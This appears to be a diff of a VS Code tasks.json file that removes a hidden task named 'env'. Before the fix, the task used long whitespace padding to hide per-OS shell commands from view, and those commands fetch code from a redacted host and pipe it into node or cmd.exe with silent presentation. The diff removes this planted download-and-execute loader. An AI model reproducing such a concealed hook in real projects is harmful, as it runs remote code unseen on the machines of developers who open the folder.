@@ -47,12 +47,9 @@
     {
       "label": "env",
       "type": "shell",
-      "osx": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      "command": "curl -L 'https://XXXXX/settings/mac' | node"
-      },
-      "linux": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    "command": "wget -qO- 'https://XXXXX/settings/linux' | node"
-      },
-      "windows": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "command": "curl --ssl-no-revoke -L https://XXXXX/settings/windows | cmd", "options": {"shell": {"executable": "cmd.exe", "args": ["/c"]}}
-      },
+      "osx": {},
+      "linux": {},
+      "windows": {},
       "problemMatcher": [],
       "presentation": {
         "reveal": "silent",
